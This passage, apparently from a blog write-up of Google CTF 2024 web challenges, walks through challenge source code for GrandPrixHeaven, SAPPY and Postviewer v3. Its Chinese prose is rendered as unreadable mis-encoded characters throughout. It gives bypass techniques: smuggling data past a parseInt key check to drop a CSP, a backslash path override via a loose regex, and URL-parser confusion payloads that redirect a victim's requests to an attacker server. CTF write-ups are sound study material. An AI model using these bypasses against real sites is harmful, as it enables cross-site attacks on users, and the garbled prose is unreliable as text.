punctuation">&#125;</span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>needleBody</code> æ˜¯å¯æ§çš„ï¼Œä¸»è¦æ˜¯æœƒæª¢æŸ¥ key è·Ÿ value çš„åˆæ³•æ€§ï¼Œä½† key çš„æª¢æŸ¥ <code>isNum(parseInt(k))</code> æœ‰å•é¡Œï¼Œ<code>parseInt</code> çš„è½‰æ›å¾ˆå¯¬é¬†ï¼Œ<code>parseInt(&#39;123hello&#39;)</code> æœƒè®Šæˆ <code>123</code>ï¼Œæ‰€ä»¥å¯ä»¥åœ¨æ•¸å­—å¾Œé¢æ”¾ä»»æ„å­—ä¸²ç¹éã€‚</p><p>é€™é‚Šçš„ <code>boundary</code> æ˜¯å·²çŸ¥çš„ï¼Œå› æ­¤å¯ä»¥è‡ªå·±å¾ key å·æ¸¡è³‡æ–™é€²å»ã€‚</p><p>æ¥è‘—æœƒç™¼ä¸€å€‹è«‹æ±‚åˆ° TEMPLATE_SERVER å»ï¼Œç„¶å¾Œ TEMPLATE_SERVER æ˜¯é€™æ¨£è™•ç†çš„ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> templates <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./templates'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">parseMultipartData</span>  <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">data<span class="token punctuation">,</span> boundary</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> chunks <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span>boundary<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// always start with the &lt;head> element</span>  <span class="token keyword">var</span> processedTemplate <span class="token operator">=</span> templates<span class="token punctuation">.</span>head_start<span class="token punctuation">;</span>  <span class="token comment">// to prevent loading an html page of arbitrarily large size, limit to just 7 at a time</span>  <span class="token keyword">let</span> end <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>chunks<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&lt;=</span> end<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    end <span class="token operator">=</span> chunks<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> end<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// seperate body from the header parts</span>    <span class="token keyword">var</span> lines <span class="token operator">=</span> chunks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'\r\n\r\n'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token operator">=></span> item<span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> item <span class="token operator">!=</span> <span class="token string">''</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> item <span class="token keyword">of</span> Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>templates<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>lines<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            processedTemplate <span class="token operator">+=</span> templates<span class="token punctuation">[</span>item<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> processedTemplate<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚ä¸Šæ‰€è¿°ï¼Œæˆ‘å€‘å¯ä»¥è‡ªå·±å·åŠ æ±è¥¿é€²å»ï¼Œä¸¦ä¸”è®“ csp ä¸è¦è¢«æ¸²æŸ“ã€‚</p><p>è€Œå‰ç«¯çš„éƒ¨åˆ†æœ‰ä¸€å€‹åœ°æ–¹è¦ç¹ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> <span class="token function-variable function">clean</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">path</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>path<span class="token punctuation">)</span> <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"no path"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> re <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^[A-z0-9\s_-]+$</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>re<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// normalize</span>        <span class="token keyword">let</span> cleaned <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\s</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> cleaned<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"regex fail"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token string">"dfv"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  url <span class="token operator">=</span> <span class="token function">clean</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token string">'https://grandprixheaven-web.2024.ctfcompetition.com/api/get-car/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€™è£¡çš„æª¢æŸ¥ <code>A-z</code> æ˜¯é‡é»ï¼Œå› ç‚ºä¸­é–“æœ‰äº›ç¬¦è™Ÿè¢«åŠ é€²å»äº†ï¼Œå¦‚ <code>\</code>ï¼Œå› æ­¤å¯ä»¥è®“ url æ˜¯ <code>\test</code>ï¼Œå°±å¯ä»¥è“‹æ‰åŸæœ¬çš„ <code>/api/get-car</code>ï¼ŒæŠŠè·¯å¾‘æ”¹æ‰ã€‚</p><p>ä¸Šé¢åªæ˜¯ç°¡å–®è¨˜éŒ„ä¸€ä¸‹ï¼Œæƒ³çœ‹æ›´è©³ç´°çš„æ­¥é©Ÿè·Ÿé¡Œç›®ï¼Œå¯ä»¥ç›´æ¥çœ‹ä½œè€…çš„ writeupï¼š<a href="https://github.com/google/google-ctf/tree/main/2024/quals/web-grandprixheaven/solution">https://github.com/google/google-ctf/tree/main/2024/quals/web-grandprixheaven/solution</a></p><h2><span id="sappy-64-solves">SAPPY (64 solves)</span></h2><p>é€™é¡Œä¸€æ¨£æˆ‘é‚„æ²’çœ‹çš„æ™‚å€™éšŠå‹å°±è§£æ‰äº†ï¼Œå¤§æ¦‚è¬›ä¸€ä¸‹æ ¸å¿ƒä»¥åŠè¨˜éŒ„ä¸€ä¸‹ Discord çš„è¨è«–ã€‚</p><p>æ ¸å¿ƒç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> Uri <span class="token operator">=</span> goog<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"goog.Uri"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">validate</span><span class="token punctuation">(</span><span class="token parameter">host</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> h <span class="token operator">=</span> Uri<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>h<span class="token punctuation">.</span><span class="token function">hasQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">throw</span> <span class="token string">"invalid host"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>h<span class="token punctuation">.</span><span class="token function">getDomain</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">"sappy-web.2024.ctfcompetition.com"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">throw</span> <span class="token string">"invalid host"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> host<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åŸºæœ¬ä¸Šå°±æ˜¯è¦ç¹éé€™å€‹æª¢æŸ¥ï¼Œè®“å‚³å…¥çš„ç¶²å€å¯ä»¥ç™¼é€è«‹æ±‚åˆ°è‡ªå·±çš„ serverã€‚</p><p>æœ‰çœ‹åˆ°å…©ç¨®ç¹éæ–¹å¼ï¼Œä¸€ç¨®æ˜¯ç”¨ data URIï¼š<code>data://sappy-web.2024.ctfcompetition.com/;base64,...</code>ï¼Œå°é€™å€‹ lib ä¾†èªªï¼Œdomain æœƒè¢«è§£æç‚º <code>sappy-web.2024.ctfcompetition.com</code>ã€‚</p><p>å¦ä¸€ç¨®æ˜¯ <code>\\\\www%2eURL%2ex://sappy-web.2024.ctfcompetition.com</code>ï¼Œè®“ parser èªç‚ºå‰é¢çš„ <code>\\\\www%2eURL%2ex</code> æ˜¯ schemeï¼Œä½†å°ç€è¦½å™¨ä¾†èªªæœƒæŠŠ <code>\\</code> è§£ææˆ <code>//</code>ï¼Œå› æ­¤å°±æ˜¯ <code>https://www.URL.ex//sappy-web.2024.ctfcompetition.com</code>ã€‚</p><p>æ›´è©³ç´°çš„éç¨‹å¯ä»¥åƒè€ƒé€™ç¯‡ï¼š <a href="https://zimzi.substack.com/p/googlectf-2024-sappy">googleCTF 2024 sappy</a></p><h2><span id="postviewer-v3-19-solves">POSTVIEWER V3 (19 solves)</span></h2><p>2022 å¹´çš„ <a href="https://blog.huli.tw/2022/07/09/google-ctf-2022-writeup/">v1</a> æ²’è§£å‡ºä¾†ï¼Œ2023 å¹´çš„ <a href="https://blog.huli.tw/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/">v2</a> ä¹Ÿæ²’è§£å‡ºä¾†ï¼Œåˆ°äº†ä»Šå¹´å‡ºäº† v3ï¼Œçµ‚æ–¼è§£å‡ºä¾†äº†ã€‚</p><p>ä»Šå¹´çš„ç‰ˆæœ¬æ ¸å¿ƒæ¦‚å¿µè·Ÿä¹‹å‰ä¸€æ¨£ï¼Œéƒ½æ˜¯æƒ³åšå‡ºä¸€å€‹æœ‰ sandbox çš„ preview file æ©Ÿåˆ¶ã€‚ä»‹é¢å¾ˆç°¡å–®ï¼Œå°±ä¸€å€‹è®“ä½ å¯ä»¥æ–°å¢æª”æ¡ˆçš„åŠŸèƒ½è€Œå·²ï¼š</p><p><img src="/img/google-ctf-2024-writeup/p1.png" alt="upload file"></p><p>é»æ“Šæª”æ¡ˆä»¥å¾Œï¼Œæœƒæ›´æ–° URL ä¸Šçš„ hashï¼Œé€™å€‹ hash çš„å€¼æ˜¯ <code>sha1(filename)</code>ï¼Œæ¥è‘—æ ¹æ“šæª”æ¡ˆåç¨±å» IndexedDB è£¡é¢å–å¾—å…§å®¹ï¼Œç„¶å¾Œæ‰æ˜¯é‡é»ã€‚</p><p>å–å¾—å…§å®¹ä»¥å¾Œï¼Œæœƒå…ˆç”¢ç”Ÿä¸€å€‹ sandbox domainï¼Œé€™å€‹ domain çš„åç¨±å–æ±ºæ–¼ï¼š<code>calculateHash(body, product, window.origin, location.href)</code>ï¼Œbody æ˜¯ä¸€å€‹å›ºå®šçš„ HTMLï¼Œproduct ä¹Ÿæ˜¯å›ºå®šçš„ã€‚</p><p>å†ä¾†æœƒç”¨ iframe è¼‰å…¥é€™å€‹ sandbox domainï¼Œä¸¦ä¸”åœ¨ query string å¸¶ä¸Šï¼š<code>?o=$&#123;window.origin&#125;</code>ï¼Œåº•ä¸‹æ˜¯ç¯„ä¾‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;sbx-0wguyijf8lspklnc3724kqvia43l62tu7v1l2gdelcy503m2cd.  postviewer3-web.2024.ctfcompetition.com&#x2F;postviewer&#x2F;shim.html  ?o&#x3D;https%3A%2F%2Fpostviewer3-web.2024.ctfcompetition.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>é‚£é€™å€‹ shim.html è£¡é¢åœ¨å¹¹å˜›å‘¢ï¼Ÿå…§å®¹å¾ˆç°¡å–®ï¼Œæˆ‘åªæ“·å– JavaScript ç›¸é—œçš„æ®µè½ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token constant">HASH_REGEXP</span> <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^sbx-([a-z0-9]&#123;50&#125;)[.]</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">PRODUCT_REGEXP</span> <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[/]([a-z0-9_-]*)[/]shim.html</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">;</span><span class="token keyword">let</span> <span class="token constant">FILE_HASH</span><span class="token punctuation">,</span> <span class="token constant">PRODUCT</span><span class="token keyword">function</span> <span class="token function">_throw</span><span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerText <span class="token operator">=</span> err<span class="token punctuation">;</span>  <span class="token keyword">throw</span> <span class="token function">Error</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">try</span><span class="token punctuation">&#123;</span>  <span class="token constant">FILE_HASH</span> <span class="token operator">=</span> <span class="token constant">HASH_REGEXP</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>host<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">_throw</span><span class="token punctuation">(</span><span class="token string">"Incorrect hash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">try</span><span class="token punctuation">&#123;</span>  <span class="token constant">PRODUCT</span> <span class="token operator">=</span> <span class="token constant">PRODUCT_REGEXP</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>pathname<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">_throw</span><span class="token punctuation">(</span><span class="token string">"Incorrect product"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> <span class="token constant">TRUSTED_ORIGIN</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>href<span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^https?:\/\/</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token constant">TRUSTED_ORIGIN</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">_throw</span><span class="token punctuation">(</span><span class="token string">"Untrusted Origin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">arrayToBase36</span><span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> arr    <span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">BigInt</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span> <span class="token operator">*</span> a <span class="token operator">+</span> <span class="token function">BigInt</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">BigInt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">calculateHash</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>strings</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> encoder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TextEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> string <span class="token operator">=</span> strings<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> hash <span class="token operator">=</span> <span class="token keyword">await</span> crypto<span class="token punctuation">.</span>subtle<span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token string">'SHA-256'</span><span class="token punctuation">,</span> encoder<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">arrayToBase36</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span>hash<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">padStart</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>window<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>origin <span class="token operator">!==</span> <span class="token constant">TRUSTED_ORIGIN</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">_throw</span><span class="token punctuation">(</span><span class="token string">"Wrong origin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>body <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">||</span> <span class="token operator">!</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>mimeType<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">_throw</span><span class="token punctuation">(</span><span class="token string">"No content to render"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>body<span class="token punctuation">,</span> salt<span class="token punctuation">,</span> mimeType<span class="token punctuation">&#125;</span> <span class="token operator">=</span> e<span class="token punctuation">.</span>data<span class="token punctuation">;</span>    <span class="token punctuation">[</span>body<span class="token punctuation">,</span> salt<span class="token punctuation">,</span> mimeType<span class="token punctuation">,</span> <span class="token constant">PRODUCT</span><span class="token punctuation">,</span> <span class="token constant">TRUSTED_ORIGIN</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> e <span class="token operator">!==</span> <span class="token string">'string'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">_throw</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Expected '</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>e<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">' to be a string.</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> hash <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">calculateHash</span><span class="token punctuation">(</span>body<span class="token punctuation">,</span> <span class="token constant">PRODUCT</span><span class="token punctuation">,</span> <span class="token constant">TRUSTED_ORIGIN</span><span class="token punctuation">,</span> salt<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>hash <span class="token operator">!==</span> <span class="token constant">FILE_HASH</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">_throw</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Expected hash: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>hash<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> blob <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span>body<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> mimeType <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    window<span class="token punctuation">.</span>onmessage <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    e<span class="token punctuation">.</span>source<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'blob loaded'</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>    location<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span>blob<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åŸºæœ¬ä¸Šå°±æ˜¯æª¢æŸ¥å¹¾å€‹æ±è¥¿ï¼š</p><ol><li>onmessage çš„ origin æ˜¯ä¸æ˜¯ç¶²å€åˆ—ä¸Šçš„ origin</li><li>å‚³å…¥çš„è³‡æ–™ hash éå¾Œï¼Œæ˜¯ä¸æ˜¯èˆ‡ domain name ç›¸ç­‰</li></ol><p>å¦‚æœä»¥ä¸Šéƒ½ç¬¦åˆï¼Œé‚£å°±æŠŠå‚³å…¥çš„ body è®Šæˆ blobï¼Œç„¶å¾Œè¼‰å…¥é€™å€‹ blobã€‚</p><p>æ¥è‘—è®“æˆ‘å€‘å›ä¾†çœ‹å‰›å‰›æåˆ°çš„ iframeï¼Œåœ¨é€™å€‹ shim.html çš„ iframe è¼‰å…¥å®Œæˆå¾Œï¼Œæœƒå‘é€™å€‹ iframe postMessageï¼Œå‚³å…¥å‰›å‰›è¬›çš„å›ºå®šçš„ HTMLï¼Œå…§å®¹ç‚ºï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Evaluator<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">      <span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token parameter">e</span> <span class="token operator">=></span> <span class="token 